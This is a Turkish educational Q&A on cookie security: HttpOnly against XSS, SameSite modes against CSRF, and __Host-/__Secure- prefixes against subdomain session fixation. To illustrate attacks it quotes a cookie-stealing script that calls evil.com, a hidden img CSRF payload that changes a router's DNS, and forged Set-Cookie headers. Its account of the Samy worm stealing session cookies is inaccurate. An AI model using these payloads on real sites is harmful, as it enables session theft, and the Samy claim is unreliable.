# Hafta 23 / Gün 157: Soru & Cevap

---

## 1. Soru: `HttpOnly` Bayrağının Gücü ve XSS Durumunda Oturum Hırsızlığı Sınırları

### Soru
Web uygulamalarında oturum çerezine **`HttpOnly`** bayrağı koymak, uygulamada XSS (Cross-Site Scripting) zafiyeti bulunduğunda saldırganın oturumu çalmasını (Session Hijacking) nasıl engeller? `HttpOnly` bayrağı varken dahi bir saldırgan XSS açığını kullanarak kurban adına sunucuda işlem yapabilir mi (XSF / CSRF benzeri eylemler)? Savunmanın sınırları nelerdir?

### Detaylı ve Kapsamlı Teknik Cevap
`HttpOnly` bayrağı, Microsoft tarafından Internet Explorer 6 SP1 döneminde geliştirilen ve daha sonra RFC 6265 standardına eklenen bir tarayıcı güvenlik kısıtlamasıdır.
- **Teknik Çalışma Prensibi:** Tarayıcının JavaScript motoru (V8, SpiderMonkey, JavaScriptCore) DOM nesnesi olan `document.cookie`'yi çalıştırırken, bellekteki çerez tablosunda `HttpOnly=True` olarak işaretlenmiş kayıtları JavaScript bağlamına (context) **kesinlikle ifşa etmez**.
- **XSS Durumunda Engelleme:** Saldırgan sayfaya `<script>fetch('http://evil.com/?c=' + document.cookie)</script>` şeklinde kötü amaçlı kod enjekte etse bile, `document.cookie` string'i içerisinde oturum çerezi yer almaz. Dolayısıyla saldırgan kullanıcının oturum belirtecini (Session Token / JWT) kendi sunucusuna kopyalayamaz (Exfiltration engellenir).

**Savunmanın Sınırları ve Kurban Adına İşlem Yapma (Client-Side Action Execution):**
Ancak `HttpOnly` tek başına tam bir güvenlik kalkanı değildir:
1. **Oturum Çalınamaz ama Oturum Kullanılabilir:** Saldırgan çerezin değerini göremez (`HttpOnly` sayesinde), fakat kurbanın açık olan tarayıcı oturumunu kullanarak arka planda `fetch('/api/v1/transfer', {method: 'POST', body: ...})` isteği atabilir. Tarayıcı bu isteğe `HttpOnly` çerezini otomatik olarak ekler!
2. **Kötü Amaçlı Eylemler:** Saldırgan kullanıcının e-postasını veya parolasını değiştirecek formu kurbanın tarayıcısında arka planda sessizce tetikleyebilir.
3. **Özetle:** `HttpOnly`, saldırganın çerezi çalarak **kendi bilgisayarında oturum açmasını (Oturum Kaçırma / Hijacking)** engeller; ancak XSS zafiyeti devam ettiği sürece **kurbanın tarayıcısını bir kukla (proxy) gibi kullanmasını** tek başına engelleyemez. Bu nedenle XSS'i kökten çözmek için bağlamsal çıktı kodlama (Contextual Encoding) ve katı İçerik Güvenlik Politikası (CSP) zorunludur.

### Ustanın Çırağa Tavsiyesi / Altın Kural
> *"Çırak! HttpOnly bayrağı evin anahtarının kopyalanmasını engeller ama hırsız kapı açıkken içeri girdiyse evin içinde gezmesini engellemez. Oturum çerezine HttpOnly koymak şarttır; ama 'nasılsa HttpOnly var' diyerek XSS açıklarını hafife alırsan, saldırgan senin hesabından senin adına para transferi yapar, ruhun duymaz!"*

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2005 yılında Myspace üzerinde yayılan ve 24 saat içinde 1 milyondan fazla kullanıcıya bulaşarak tarihin en hızlı yayılan solucanı olan Samy Worm, `HttpOnly` bayrağının neden elzem olduğunu dünyaya kanıtlamıştır. Samy Kamkar, profildeki bir XSS açığını kullanarak kurbanların `document.cookie` üzerinden oturum bilgilerini almış ve her kurbanın profiline "Ama hepsinden önemlisi, Samy benim kahramanım" yazısını ekleyerek solucanın kendini çoğaltmasını sağlamıştır. Bu olaydan sonra küresel çapta tüm tarayıcılar ve web çatıları `HttpOnly` desteğini hızla zorunlu hale getirmiştir.

---

## 2. Soru: `SameSite` Politikası (Strict vs. Lax vs. None) ve CSRF Savunması

### Soru
**`SameSite`** çerez bayrağı Siteler Arası İstek Sahteciliği (CSRF) saldırılarını tarayıcı düzeyinde nasıl önler? `Strict`, `Lax` ve `None` politikaları arasındaki teknik farklar nelerdir? Neden modern tarayıcılar varsayılan olarak `SameSite=Lax` moduna geçmiştir ve `SameSite=None` kullanıldığında neden `Secure` bayrağı zorunludur?

### Detaylı ve Kapsamlı Teknik Cevap
Geleneksel web mimarisinde tarayıcılar, hedef etki alanına yapılan tüm HTTP isteklerine (istek nereden kaynaklanırsa kaynaklansın) o etki alanına ait çerezleri iliştirirdi (Ambient Authority). Bir saldırgan `saldirgan.com` sitesine koyduğu gizli bir form ile kullanıcının tarayıcısından `POST banka.com/havale` isteği tetiklediğinde, tarayıcı bankanın oturum çerezini otomatik eklerdi. Buna CSRF denir.

`SameSite` bayrağı (RFC 6265bis), çerezin hangi bağlamlarda (Context) isteğe iliştirileceğini tarayıcıya bildirir:
1. **`SameSite=Strict`:**
   - En katı güvenlik seviyesidir.
   - İstek kaynak site (Same-Site) dışından geliyorsa, **hiçbir koşulda çerez gönderilmez**.
   - Kullanıcı WhatsApp'tan veya e-postadan gelen bir `https://banka.com/hesap` bağlantısına tıklasa bile çerez gönderilmez; kullanıcı ilk açılışta oturumsuz görünür, sayfayı yenilediğinde (artık site içindedir) oturum açılır.
2. **`SameSite=Lax`:**
   - Güvenlik ve kullanılabilirlik dengesidir. Modern tarayıcıların (Chrome 80+, Firefox, Edge) varsayılanıdır.
   - Durum değiştiren (State-changing) isteklerde (`POST`, `PUT`, `DELETE`) veya `<img>`, `<iframe>` gibi alt kaynak yüklemelerinde üçüncü taraftan geliniyorsa çerez **engellenir** (CSRF'i engeller).
   - Ancak kullanıcı harici bir linke tıklayarak güvenli bir üst düzey gezinme (Top-level GET navigation) yaptığında çerez **gönderilir**, böylece kullanıcı linke tıkladığında oturumu açık başlar.
3. **`SameSite=None`:**
   - Çerezin tüm çapraz site (Cross-Site) isteklerinde taşınmasına izin verir (iFrame içindeki ödeme sistemleri veya SSO widget'ları için gerekir).
   - **Modern Tarayıcı Kuralı:** `SameSite=None` tanımlandığı anda tarayıcı **kesinlikle `Secure` bayrağının da bulunmasını şart koşar (`SameSite=None; Secure`)**. Aksi halde modern tarayıcılar bu çerezi derhal reddeder ve belleğe kaydetmez. Bu kural, şifresiz kanallarda üçüncü taraf çerez takibini ve dinlemeyi engeller.

### Ustanın Çırağa Tavsiyesi / Altın Kural
> *"Çırak! Para transferi, şifre değiştirme veya yetki güncelleme gibi kritik API uçlarında çalışan oturum çerezlerinde tereddütsüz `SameSite=Strict` kullanacaksın. Kullanıcı deneyiminin ön planda olduğu genel portallarda ise asgari standart `SameSite=Lax` olmalıdır. `SameSite=None` yazıyorsan, yanına `Secure` koymayı unuttuğun an modern tarayıcılar çerezini çöpe atar!"*

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2008 yılında popüler bir ev router (modem) üreticisinin yönetim arayüzünde CSRF açığı bulundu. Saldırganlar popüler web sitelerine gizli `<img>` etiketleri yerleştirdi: `<img src="http://192.168.1.1/apply.cgi?dns1=attacker_ip">`. Kullanıcı sayfayı açtığında, tarayıcısı yerel ağdaki modeme istek attı ve modemin varsayılan oturum çerezleri otomatik eklendi. Bu sayede milyonlarca kullanıcının DNS sunucusu saldırganın sahte DNS'ine yönlendirildi. `SameSite` standardı o yıllarda var olsaydı, tarayıcı bu çapraz site isteğine çerezi eklemeyecek ve saldırı başlamadan engellenecekti.

---

## 3. Soru: RFC 6265bis Çerez Önekleri: `__Host-` ve `__Secure-` Mimarisi

### Soru
RFC 6265bis standardında tanımlanan **`__Host-`** ve **`__Secure-`** çerez önekleri (Cookie Prefixes) hangi kritik tasarım açığını kapatmak için getirilmiştir? `__Host-` önekli bir çerezde `Domain` özniteliğinin bulunması neden kesinlikle yasaklanmıştır ve bu kısıtlama alt alan adı devralma (Subdomain Takeover) veya alt alan adı XSS saldırılarına karşı ana etki alanını nasıl korur?

### Detaylı ve Kapsamlı Teknik Cevap
HTTP çerez mekanizmasının en eski ve en tehlikeli tasarım kusurlarından biri **"Çerez Gölgeleme / Sabitleme (Cookie Shadowing & Fixation via Subdomains)"** zafiyetidir.

**Tarihsel Zafiyet Mimarisi:**
- Bir tarayıcı `banka.com` sitesine istek gönderirken, hem `banka.com` tarafından hem de `pazarlama.banka.com` veya `test.banka.com` gibi herhangi bir alt alan tarafından yazılmış olan `session` isimli çerezleri bir arada toplar ve sunucuya yalnızca `Cookie: session=xyz` şeklinde gönderir.
- Sunucu, gelen çerezin ana etki alanından mı yoksa güvensiz bir alt alandan mı yazıldığını **anlayamaz**.
- Eğer şirketin `blog.banka.com` veya `kampanya.banka.com` gibi üçüncü parti bir ajans tarafından yönetilen alt alanında XSS açığı çıkarsa veya bu alt alan sahipsiz kalarak devralınırsa (Subdomain Takeover), saldırgan şu başlığı basabilir:
  `Set-Cookie: session=attacker_fixated_id; Domain=banka.com; Path=/`
- Kullanıcı ana `banka.com` sitesine gittiğinde tarayıcı saldırganın enjekte ettiği çerezi gönderir ve kullanıcının oturumu saldırgan tarafından sabitlenir (Session Fixation).

**RFC 6265bis Çerez Önekleri ile Kökten Çözüm:**
Tarayıcılar artık çerez isminin başındaki özel öneklere bakarak katı sözleşmeler (contracts) uygular:

1. **`__Secure-` Öneki:**
   - İsim `__Secure-` ile başlıyorsa, çerez **yalnızca HTTPS** üzerinden kabul edilir (`Secure=True` zorunlu). Düz metin HTTP ile ezilemez.
2. **`__Host-` Öneki (Kusursuz İzolasyon):**
   - Çerez **yalnızca HTTPS** üzerinden kabul edilir (`Secure=True`).
   - `Path=/` (kök dizin) olmak zorundadır.
   - **EN KRİTİK ŞART:** `Domain` özniteliği **KESİNLİKLE BULUNMAMALIDIR (Host-Only Cookie)**.
   - Eğer `Set-Cookie: __Host-auth=123; Domain=banka.com` şeklinde bir başlık gelirse, tarayıcı bu başlığı doğrudan **geçersiz sayar ve çöpe atar**.
   - **Sonuç:** `__Host-` çerezi yalnızca ve yalnızca onu yazan spesifik ana makineye (FQDN) bağlanır. Hiçbir alt alan adı (`alt.banka.com`), ana makinenin `__Host-` çerezini ezemez, okuyamaz veya sahtesini üretemez!

### Ustanın Çırağa Tavsiyesi / Altın Kural
> *"Çırak! Kurumsal bir sistemde oturum çerezi tanımlarken adını `session` veya `token` koyup bırakırsan, yarın öbür gün pazarlamanın açtığı dandik bir WordPress alt alanından oturumun hacklenir. Oturum çerezin adını daima `__Host-` ile başlatacaksın, Domain parametresini tamamen sileceksin ve Path'i kök (/) yapacaksın. Tarayıcıya diyeceksin ki: Bu çerezin sahibi yalnızca bu sunucudur, başka hiç kimse karışamaz!"*

### Gerçek Hayat Senaryosu / Yaşanmış Olay
2017 yılında büyük bir teknoloji şirketinin ana portalında ilginç bir açık bulundu. Şirket, kullanıcı oturumlarını `session_id` çerezi ile takip ediyordu ve `Domain=.sirket.com` olarak tanımlamıştı. Bir güvenlik araştırmacısı, şirketin terk edilmiş eski bir alt alanını (`careers-stage.sirket.com`) AWS Route 53 üzerinden devraldı (Subdomain Takeover). Bu alt alandan `Set-Cookie: session_id=malicious_session; Domain=sirket.com; Path=/` başlığı atarak ana portala giren tüm personelin oturumlarını saldırganın belirlediği oturuma sabitledi. Şirket, bu olaydan sonra tüm kritik oturum çerezlerini `__Host-` önekli host-only çerezlere dönüştürerek alt alan saldırı yüzeyini tamamen izole etti.
